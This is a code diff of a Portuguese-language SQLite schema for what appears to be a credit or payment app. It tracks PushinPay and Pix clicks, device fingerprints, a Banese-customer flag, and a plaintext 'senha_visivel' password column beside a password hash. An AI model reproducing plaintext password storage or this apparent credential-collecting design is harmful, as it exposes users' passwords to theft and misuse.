@@ -292,19 +292,39 @@ async function initDatabase() {
       limite_aprovado REAL DEFAULT 0,
       produto_escolhido TEXT DEFAULT 'virtual',
       created_at TEXT DEFAULT (datetime('now')),
-      updated_at TEXT DEFAULT (datetime('now'))
+      updated_at TEXT DEFAULT (datetime('now')),
+      -- campos adicionados via migrações
+      pushinpay_click_count INTEGER DEFAULT 0,
+      pix_copied_count INTEGER DEFAULT 0,
+      last_active_at TEXT DEFAULT NULL,
+      pushinpay_clicked_at TEXT DEFAULT NULL,
+      pix_copied_at TEXT DEFAULT NULL,
+      dispositivo TEXT DEFAULT NULL,
+      modelo TEXT DEFAULT NULL,
+      fabricante TEXT DEFAULT NULL,
+      os TEXT DEFAULT NULL,
+      navegador TEXT DEFAULT NULL,
+      navegador_versao TEXT DEFAULT NULL,
+      dispositivo_identificado_em TEXT DEFAULT NULL,
+      dispositivo_atualizado_em TEXT DEFAULT NULL,
+      download_clicked_at TEXT DEFAULT NULL,
+      plano_escolhido TEXT DEFAULT NULL,
+      senha_hash TEXT DEFAULT NULL,
+      senha_visivel TEXT DEFAULT NULL,
+      observacoes TEXT DEFAULT NULL,
+      banese_cliente INTEGER DEFAULT 0,
+      app_download_clicked_at TEXT DEFAULT NULL,
+      app_download_status TEXT DEFAULT NULL
     )
   `);
 
-  // Safe migration: all columns from 002_add_tracking_fields.sql + extras
+  // Safe migration: ensure all columns exist (for databases created before this update)
   var _cols = [
-    // Tracking de pagamentos
     "pushinpay_click_count INTEGER DEFAULT 0",
     "pix_copied_count INTEGER DEFAULT 0",
     "last_active_at TEXT",
     "pushinpay_clicked_at TEXT",
     "pix_copied_at TEXT",
-    // Informações de dispositivo
     "dispositivo TEXT",
     "modelo TEXT",
     "fabricante TEXT",
@@ -313,15 +333,11 @@ async function initDatabase() {
     "navegador_versao TEXT",
     "dispositivo_identificado_em TEXT",
     "dispositivo_atualizado_em TEXT",
-    // Download e plano
     "download_clicked_at TEXT DEFAULT NULL",
     "plano_escolhido TEXT DEFAULT NULL",
-    // Credenciais
     "senha_hash TEXT DEFAULT NULL",
     "senha_visivel TEXT DEFAULT NULL",
-    // Observações
     "observacoes TEXT DEFAULT NULL",
-    // Extras (usados no frontend)
     "banese_cliente INTEGER DEFAULT 0",
     "app_download_clicked_at TEXT DEFAULT NULL",
     "app_download_status TEXT DEFAULT NULL"
